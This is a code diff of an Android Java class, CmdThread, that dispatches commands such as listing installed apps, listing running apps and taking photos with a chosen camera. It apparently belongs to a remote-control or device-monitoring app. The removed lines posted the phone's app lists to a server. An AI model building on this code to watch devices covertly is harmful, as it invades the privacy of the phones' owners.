@@ -4,18 +4,9 @@ import android.text.TextUtils;
 import android.util.SparseArray;
 
 import com.amap.api.location.AMapLocation;
-import com.fs.fs.api.network.ApiConfig;
-import com.fs.fs.api.network.core.BaseResponse;
-import com.fs.fs.api.network.core.HttpParams;
-import com.fs.fs.api.network.core.OkHttpUtils;
-import com.fs.fs.api.network.core.callback.HttpCallback;
-import com.fs.fs.bean.AppInfo;
 import com.fs.fs.utils.Constant;
 
-import java.util.List;
 import java.util.Map;
-
-import okhttp3.Headers;
 
 /**
  * Created by wyx on 2017/1/7.
@@ -46,44 +37,11 @@ public class CmdThread extends Thread {
             String cameraIndex = null;
             switch (cmd) {
                 case app:
-                    AppInfoService.getInstance().getInstallAppInfo(new AppInfoService.AppInfoListener() {
-                        @Override
-                        public void onSucceed(List<AppInfo> appInfos) {
-                            HttpParams httpParams = new HttpParams();
-                            httpParams.addJson("app_info", appInfos);
-                            OkHttpUtils.post(ApiConfig.getInstallAppInfo(), httpParams, new HttpCallback(BaseResponse.class) {
-                                @Override
-                                public void onSuccess(BaseResponse httpResponse, Headers headers) {
-
-                                }
-
-                                @Override
-                                public void onError(String errorMsg) {
-
-                                }
-                            });
-                        }
-                    });
+                    //TODO: Handler
+                    AppInfoService.getInstance().getInstallAppInfo();
                     break;
                 case run_app:
-                    AppInfoService.getInstance().getRunningAppInfo(new AppInfoService.AppInfoListener() {
-                        @Override
-                        public void onSucceed(List<AppInfo> appInfos) {
-                            HttpParams httpParams = new HttpParams();
-                            httpParams.addJson("app_info", appInfos);
-                            OkHttpUtils.post(ApiConfig.getRunningAppInfo(), httpParams, new HttpCallback(BaseResponse.class) {
-                                @Override
-                                public void onSuccess(BaseResponse httpResponse, Headers headers) {
-
-                                }
-
-                                @Override
-                                public void onError(String errorMsg) {
-
-                                }
-                            });
-                        }
-                    });
+                    AppInfoService.getInstance().getRunningAppInfo();
                     break;
                 case photo:
                     cameraIndex = mMap.get("camera_index");
